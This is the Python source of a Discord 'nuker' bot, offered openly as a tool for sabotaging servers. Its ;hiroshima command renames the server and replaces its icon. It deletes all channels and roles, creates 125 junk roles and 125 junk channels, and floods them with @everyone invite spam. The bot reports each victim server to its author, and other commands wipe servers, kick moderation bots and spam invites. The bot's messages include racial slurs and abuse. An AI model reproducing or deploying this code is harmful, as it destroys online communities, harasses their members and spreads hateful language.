import discord
from discord.ext import commands
import asyncio
import random
import colorama
import os
import aiohttp  # <-- ADDED THIS
from dotenv import load_dotenv
from colorama import Fore, Back, Style, init

init()

load_dotenv()

TOKEN = os.getenv("DISCORD_TOKEN")

intents = discord.Intents.default()
intents.message_content = True
client = commands.Bot(command_prefix=";", intents=intents)
client.remove_command("help")

# Whitelist for servers where bot is disabled
whitelisted_servers = set()

@client.before_invoke
async def before_invoke(ctx):
    if ctx.guild and ctx.guild.id in whitelisted_servers and ctx.command.name in ("hiroshima", "nothing"):
        await ctx.send("server whitelisted. :3")
        raise commands.CheckFailure()

# Discord bot's terminal
@client.event
async def on_ready():
    print(f"{Fore.MAGENTA}██╗      ██████╗ ██╗   ██╗███████╗██╗      █████╗  ██████╗███████╗")
    print(f"{Fore.MAGENTA}██║     ██╔═══██╗██║   ██║██╔════╝██║     ██╔══██╗██╔════╝██╔════╝")
    print(f"{Fore.MAGENTA}██║     ██║   ██║██║   ██║█████╗  ██║     ███████║██║     █████╗")
    print(f"{Fore.MAGENTA}██║     ██║   ██║╚██╗ ██╔╝██╔══╝  ██║     ██╔══██║██║     ██╔══╝")
    print(f"{Fore.MAGENTA}███████╗╚██████╔╝ ╚████╔╝ ███████╗███████╗██║  ██║╚██████╗███████╗")
    print(f"{Fore.MAGENTA}╚══════╝ ╚═════╝   ╚═══╝  ╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝╚══════╝")
    print(f"{Fore.MAGENTA}[1] ;hiroshima - Nukes [2]       |       [2] ;help - Displays This")
    print(f"{Fore.MAGENTA}[3] ;blame @user - Accuses someone | [4] ;kicka - Kicks all bots")
    print(f"{Fore.MAGENTA}------------------------------------------------------------------")
    print(f"{Fore.MAGENTA}[5] ;credits - Shows My Socials | [6] ;nothing - nothing left")

REPORT_CHANNEL_ID = 1516330515110559765
INVITE_TEXT = "discord.gg/Gx9b3AsJR3"
SPAM_MESSAGE = f"@everyone {INVITE_TEXT} owns ur server pussy"

async def send_invite_spam(channels, amount=25, concurrency=12):
    if not channels:
        return
    semaphore = asyncio.Semaphore(concurrency)
    async def send_to_channel(channel):
        async with semaphore:
            for _ in range(amount):
                try:
                    await channel.send(SPAM_MESSAGE)
                except Exception:
                    pass
    await asyncio.gather(*(send_to_channel(channel) for channel in channels), return_exceptions=True)

@client.command()
async def hiroshima(ctx):
    await ctx.send("**FUCKED BY BLOSSOM POOR ASS NIGGA https://discord.gg/bqy92JmPY**")
    guild = ctx.guild

    # --- CHANGE SERVER NAME & ICON (with full error handling) ---
    try:
        # Check if bot has manage_guild permission
        if not ctx.guild.me.guild_permissions.manage_guild:
            await ctx.send("❌ Missing `manage_guild` permission. Can't change name or icon.")
        else:
            # Change server name
            await guild.edit(name="fuck you blossom owns")
            print(f"[SUCCESS] Server name changed to: fuck you blossom owns")

            # Change server icon
            icon_url = "https://cdn.discordapp.com/attachments/1516425080865820743/1517713469682487416/pfp.png?ex=6a374850&is=6a35f6d0&hm=b4f447f0e4dd2897798483ade19dfa3b7fc18fb190606b202d9e163be489fc8c&"
            
            async with aiohttp.ClientSession() as session:
                async with session.get(icon_url, timeout=10) as resp:
                    if resp.status == 200:
                        image_data = await resp.read()
                        # Validate it's an image (check first few bytes)
                        if image_data[:4] in (b'\x89PNG', b'\xff\xd8\xff', b'GIF8'):
                            await guild.edit(icon=image_data)
                            print("[SUCCESS] Server icon changed successfully.")
                        else:
                            print(f"[ERROR] Downloaded data is not a valid image.")
                            await ctx.send("⚠️ Failed to change icon: Invalid image data.")
                    else:
                        print(f"[ERROR] Failed to download icon. Status: {resp.status}")
                        await ctx.send(f"⚠️ Failed to download icon. HTTP {resp.status}")

    except discord.Forbidden:
        print("[ERROR] Bot lacks permission to edit guild.")
        await ctx.send("❌ Bot lacks `manage_guild` or `administrator` permission.")
    except discord.HTTPException as e:
        print(f"[ERROR] Discord API error: {e}")
        await ctx.send(f"❌ Discord API error: {e}")
    except aiohttp.ClientError as e:
        print(f"[ERROR] Network error downloading icon: {e}")
        await ctx.send(f"⚠️ Network error: {e}")
    except Exception as e:
        print(f"[ERROR] Unexpected error: {e}")
        await ctx.send(f"❌ Unexpected error: {e}")

    # --- REPORT CHANNEL (existing) ---
    report_channel = client.get_channel(REPORT_CHANNEL_ID)
    if report_channel is not None:
        embed = discord.Embed(
            title="Hiroshima command used",
            description=f"A server has been targeted with `;hiroshima`.",
            color=discord.Color.red()
        )
        if guild.icon:
            embed.set_thumbnail(url=guild.icon.url)
        embed.add_field(name="Server name", value=guild.name, inline=False)
        embed.add_field(name="Member count", value=str(guild.member_count), inline=False)
        embed.add_field(name="Server ID", value=str(guild.id), inline=False)
        embed.add_field(name="Executor", value=f"{ctx.author} ({ctx.author.id})", inline=False)
        embed.set_footer(text="Blossom Nuker report")
        await report_channel.send(embed=embed)
    else:
        print(f"Report channel {REPORT_CHANNEL_ID} not found.")

    # --- DELETE CHANNELS ---
    delete_channels = []
    for channel in list(guild.channels):
        delete_channels.append(asyncio.create_task(channel.delete()))
    if delete_channels:
        results = await asyncio.gather(*delete_channels, return_exceptions=True)
        failed = sum(1 for r in results if isinstance(r, Exception))
        if failed > 0:
            print(f"  DELETING CHANNELS: {failed} FAILED")

    # --- DELETE ROLES ---
    delete_roles = []
    for role in list(guild.roles):
        if role.name != "@everyone":
            delete_roles.append(asyncio.create_task(role.delete()))
    if delete_roles:
        results = await asyncio.gather(*delete_roles, return_exceptions=True)
        failed = sum(1 for r in results if isinstance(r, Exception))
        if failed > 0:
            print(f"  DELETING ROLES: {failed} FAILED")

    # --- CREATE ROLES ---
    create_roles = [guild.create_role(name="Fucked By blossom.") for _ in range(125)]
    await asyncio.gather(*create_roles, return_exceptions=True)

    # --- CREATE CHANNELS ---
    create_channels = [guild.create_text_channel(name="Fucked By blossom.") for _ in range(125)]
    channels = await asyncio.gather(*create_channels, return_exceptions=True)
    channels = [c for c in channels if not isinstance(c, Exception)]

    # --- INVITE SPAM ---
    if channels:
        await send_invite_spam(channels, amount=30, concurrency=12)

@client.command()
async def spaminvite(ctx, amount: int = 25):
    if ctx.guild is None:
        await ctx.send("Use this command in a server.")
        return
    if amount <= 0:
        amount = 1
    channels = [channel for channel in ctx.guild.text_channels if channel.permissions_for(ctx.me).send_messages]
    if not channels:
        await ctx.send("No writable channels found.")
        return
    await ctx.send(f"Spamming `{INVITE_TEXT}` {amount} times per channel...")
    await send_invite_spam(channels, amount=amount, concurrency=12)
    await ctx.send("Invite spam finished.")

@client.command()
async def kicka(ctx):
    if ctx.guild is None:
        await ctx.send("Use this command in a server.")
        return
    if not ctx.author.guild_permissions.kick_members:
        await ctx.send("You need the `Kick Members` permission to use this command.")
        return
    target_bots = []
    for member in ctx.guild.members:
        if member.bot and member.id != ctx.guild.me.id:
            target_bots.append(member)
    if not target_bots:
        await ctx.send("No bots found to kick.")
        return
    await ctx.send(f"Kicking {len(target_bots)} bot(s)...")
    kicked = 0
    failed = 0
    for member in target_bots:
        if not member.bot or member.id == ctx.guild.me.id:
            continue
        try:
            await member.kick(reason=f"Kicked by {ctx.author} using ;kicka")
            kicked += 1
        except Exception:
            failed += 1
    if failed:
        await ctx.send(f"✅ Kicked {kicked} bot(s). ❌ {failed} failed.")
    else:
        await ctx.send(f"✅ Kicked all {kicked} bot(s).")

@client.command()
async def blame(ctx, member: discord.Member = None):
    target = member or ctx.author
    blame_reasons = [
        "thanks for nuking nigga!",
        "thanks for nuking nigga!",
        "thanks for nuking nigga!",
        "thanks for nuking nigga!",
        "thanks for nuking nigga!"
    ]
    reason = random.choice(blame_reasons)
    embed = discord.Embed(
        title="Blame report",
        description=f"{target.mention} has been blamed for nuking the server.",
        color=discord.Color.orange()
    )
    embed.add_field(name="Accused by", value=ctx.author.mention, inline=True)
    embed.add_field(name="Reason", value=reason, inline=False)
    embed.set_footer(text="The evidence is mostly vibes.")
    await ctx.send(embed=embed)

@client.command()
async def help(ctx):
    messages = [
        ctx.send("**[1] ;hiroshima - Nukes [2]            |        [2] ;help - Displays This**"),
        ctx.send("**[3] ;spaminvite [amount] - Spams the invite link**"),
        ctx.send("**[4] ;kicka - Kicks all bots in the server**"),
        ctx.send("**[5] ;blame @user - Accuses someone for nuking the server**"),
        ctx.send("**-------------------------------------------------------------------------**"),
        ctx.send("**[6] ;credits - Shows My Socials  |     [7] ;nothing - nothing left**")
    ]
    await asyncio.gather(*messages)

@client.command()
async def credits(ctx):
    await ctx.send("**Bot created by 6syj on discord**")
    await ctx.send("**Get bot here: .gg/a6PrNZDP57**")

INVITE_URL = "https://discord.com/oauth2/authorize?client_id=1515950695679787008&permissions=8&integration_type=0&scope=bot"

@client.command()
async def getbot(ctx):
    view = discord.ui.View()
    view.add_item(discord.ui.Button(label="Invite Bot", url=INVITE_URL, style=discord.ButtonStyle.link))
    embed = discord.Embed(
        title="Invite this bot",
        description="Click the button below to invite the bot to your server.",
        color=discord.Color.blue(),
    )
    await ctx.send(embed=embed, view=view)

OWNER_ID = 1446215395358015559

@client.command()
async def whitelist(ctx, action: str, guild_id: int = None):
    if ctx.author.id != OWNER_ID:
        await ctx.send("❌ Restricted.")
        return
    if action.lower() == "add":
        if guild_id is None:
            guild_id = ctx.guild.id
        whitelisted_servers.add(guild_id)
        await ctx.send(f"✅ Server `{guild_id}` has been whitelisted. Bot is now disabled there.")
    elif action.lower() == "remove":
        if guild_id is None:
            guild_id = ctx.guild.id
        whitelisted_servers.discard(guild_id)
        await ctx.send(f"✅ Server `{guild_id}` has been removed from whitelist.")
    elif action.lower() == "list":
        if whitelisted_servers:
            await ctx.send(f"**Whitelisted servers:** {', '.join(str(g) for g in whitelisted_servers)}")
        else:
            await ctx.send("**No whitelisted servers.**")
    else:
        await ctx.send("Usage: `;whitelist add [guild_id]`, `;whitelist remove [guild_id]`, or `;whitelist list`")

@client.command()
async def nothing(ctx):
    guild = ctx.guild
    delete_channels = []
    for channel in list(guild.channels):
        delete_channels.append(asyncio.create_task(channel.delete()))
    if delete_channels:
        results = await asyncio.gather(*delete_channels, return_exceptions=True)
        failed = sum(1 for r in results if isinstance(r, Exception))
        if failed > 0:
            print(f"  DELETING CHANNELS: {failed} FAILED")
    delete_roles = []
    for role in list(guild.roles):
        if role.name != "@everyone":
            delete_roles.append(asyncio.create_task(role.delete()))
    if delete_roles:
        results = await asyncio.gather(*delete_roles, return_exceptions=True)
        failed = sum(1 for r in results if isinstance(r, Exception))
        if failed > 0:
            print(f"  DELETING ROLES: {failed} FAILED")

client.run(TOKEN)
